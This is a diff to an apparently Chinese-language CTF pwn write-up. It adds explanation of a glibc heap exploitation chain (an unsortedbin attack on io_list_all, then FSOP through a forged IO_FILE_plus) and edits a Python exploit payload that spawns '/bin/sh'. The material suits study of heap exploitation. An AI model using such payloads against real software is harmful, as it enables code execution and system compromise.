@@ -365,8 +365,12 @@ p.interactive()
 
 4. leak heap之后就可以unsortedbin attack, 使 io_list_all 指向 unsortedbin
 	+ 这一步会破坏unsortedbin,会报错, 那么就可以使用 Fsop
+	+ 在unsortedbin attack之前,,伪造好 IO_FILE_plus
+	+ 由于 io_list_all 指向了 unsortedbin, 在输出所有的错误信息时, 会根据 IO_FILE_plus 的_chain, 那么将原来的unsortedbin搞进smallbin就可以控制_chain指向我们伪造的IO_FILE_plus
 
 5. Fsop
+
+
 
 #### exp
 ```python
@@ -443,7 +447,7 @@ pad_payload='\x00'*0x400+'\x00'*0x20
 
 fsop_payload='/bin/sh\x00'+p64(0x61)             # 0x10
 fsop_payload+=p64(0)+p64(io_list_all-0x10)        #0x20       
-fsop_payload+=p64(2)+p64(3)                      # io_write_base io_write_ptr
+fsop_payload+=p64(2)+p64(3)                      
 fsop_payload+=vtable
 fsop_payload=fsop_payload.ljust(0xd8,'\x00')
 fsop_payload+=p64(io_file_plus+0x30)
